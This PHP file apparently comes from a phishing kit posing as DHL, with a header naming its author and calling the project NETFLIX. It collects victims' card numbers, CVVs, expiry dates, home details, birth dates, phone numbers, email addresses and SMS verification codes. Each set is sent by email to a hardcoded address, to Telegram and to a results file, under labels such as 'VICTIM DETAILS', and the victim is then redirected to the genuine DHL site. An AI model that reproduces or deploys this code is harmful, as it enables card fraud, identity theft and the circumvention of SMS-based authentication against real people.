<?php

/**
 * @link              https://www.z0n51.com/
 * @since             29/10/2020
 * @package           NETFLIX
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      NETFLIX
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include_once '../inc/app.php';
include_once '../vendor/autoload.php';
use Inacho\CreditCard;

function validate_cc_number($number = null) {
    $card = CreditCard::validCreditCard($number);
    if( $card['valid'] == false ) {
        return false;
    }
    return $card;
}

function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}

function validate_cc_date($month,$year) {
    if( validate_number($month) && strlen(trim($month)) == 2 && validate_number($year) && strlen(trim($year)) == 2 ) {
        return $month . '/' . $year;
    } else {
        return false;
    }
}

$to = 'stmptest@yahoo.com';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if ($_POST['type'] == "cc") {

        $_SESSION['cc_name']      = $_POST['cc_name'];
        $_SESSION['cc_number']      = $_POST['cc_number'];
        $_SESSION['cc_cvv']         = $_POST['cc_cvv'];
        $_SESSION['cc_date']        = $_POST['cc_date'];

        $date_ex = explode('/',$_POST['cc_date']);

        $card_number = validate_cc_number($_SESSION['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv'],$card_number['type']);
        $card_date   = validate_cc_date(trim($date_ex[0]),trim($date_ex[1]));

        $_SESSION['errors'] = [];
        if( validate_name($_POST['cc_name']) == false ) {
            $_SESSION['errors']['cc_name'] = 'Please enter a valid name';
        }
        if( $card_number == false ) {
            $_SESSION['errors']['cc_number'] = 'Please enter a valid card number';
        }
        if( $card_date == false ) {
            $_SESSION['errors']['cc_date'] = 'Please enter a valid date';
        }
        if( $card_cvv == false ) {
            $_SESSION['errors']['cc_cvv'] = 'Please enter a valid security code';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = get_user_ip() . ' | DHL | Card';
            $message = '/-- CARD INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'Card name : ' . $_POST['cc_name'] . "\r\n";
            $message .= 'Card number : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Card date : ' . $_POST['cc_date'] . "\r\n";
            $message .= 'Card cvv : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END CARD INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- CARD INFOS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'Card name : ' . $_POST['cc_name'] . "\r\n";
            $telegram_message .= 'Card number : ' . $_POST['cc_number'] . "\r\n";
            $telegram_message .= 'Card date : ' . $_POST['cc_date'] . "\r\n";
            $telegram_message .= 'Card cvv : ' . $_POST['cc_cvv'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../resultab4.txt", $message, FILE_APPEND);
            header("location: details.php?validation#_$dispatch");
        } else {
            header("location: cc.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "details") {

        $_SESSION['address']    = $_POST['address'];
        $_SESSION['zip_code']   = $_POST['zip_code'];
        $_SESSION['city']       = $_POST['city'];
        $_SESSION['birth_date'] = $_POST['birth_date'];
        $_SESSION['phone']      = $_POST['phone'];
        $_SESSION['email']      = $_POST['email'];

        $_SESSION['errors'] = [];
        if( empty($_POST['address']) ) {
            $_SESSION['errors']['address'] = 'Please enter a valid name';
        }
        if( empty($_POST['zip_code']) ) {
            $_SESSION['errors']['zip_code'] = 'Please enter a valid zip code';
        }
        if( empty($_POST['city']) ) {
            $_SESSION['errors']['city'] = 'Please enter a valid city';
        }
        if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
            $_SESSION['errors']['birth_date'] = 'Please enter a valid date';
        }
        if( validate_number($_POST['phone']) == false ) {
            $_SESSION['errors']['phone'] = 'Please enter a valid phone number';
        }
        if( validate_email($_POST['email']) == false ) {
            $_SESSION['errors']['email'] = 'Please enter a valid email address';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = get_user_ip() . ' | DHL | Details';
            $message = '/-- DETAILS INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'Address : ' . $_POST['address'] . "\r\n";
            $message .= 'Zip code : ' . $_POST['zip_code'] . "\r\n";
            $message .= 'City : ' . $_POST['city'] . "\r\n";
            $message .= 'Birth date : ' . $_POST['birth_date'] . "\r\n";
            $message .= 'Phone : ' . $_POST['phone'] . "\r\n";
            $message .= 'Email : ' . $_POST['email'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END DETAILS INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- DETAILS INFOS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'Address : ' . $_POST['address'] . "\r\n";
            $telegram_message .= 'Zip code : ' . $_POST['zip_code'] . "\r\n";
            $telegram_message .= 'City : ' . $_POST['city'] . "\r\n";
            $telegram_message .= 'Birth date : ' . $_POST['birth_date'] . "\r\n";
            $telegram_message .= 'Phone : ' . $_POST['phone'] . "\r\n";
            $telegram_message .= 'Email : ' . $_POST['email'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../resultab4.txt", $message, FILE_APPEND);
            header("location: loading.php?validation#_$dispatch");
        } else {
            header("location: details.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "confirm_code") {

        $_SESSION['confirm_code'] = $_POST['confirm_code'];

        $_SESSION['errors'] = [];
        if( empty($_POST['confirm_code']) ) {
            $_SESSION['errors']['confirm_code'] = 'Code is not valid.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = get_user_ip() . ' | DHL | Sms';
            $message = '/-- SMS INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'SMS code : ' . $_POST['confirm_code'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SMS INFOS --/' . "\r\n\r\n";

            $telegram_message = '/-- SMS INFOS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'SMS code : ' . $_POST['confirm_code'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../resultab4.txt", $message, FILE_APPEND);
            if( $_POST['error'] > 0 ) {
                header("location: https://www.dhl.com/us-en/home/customer-service.html");
                exit();
            }
            $_SESSION['errors']['confirm_code'] = 'Code is not valid.';
            header("location: loading2.php?validation#_$dispatch");
        } else {
            $error = $_POST['error'];
            header("location: ss.php?error=$error&confirmation#_$dispatch");
        }

    }

}

?>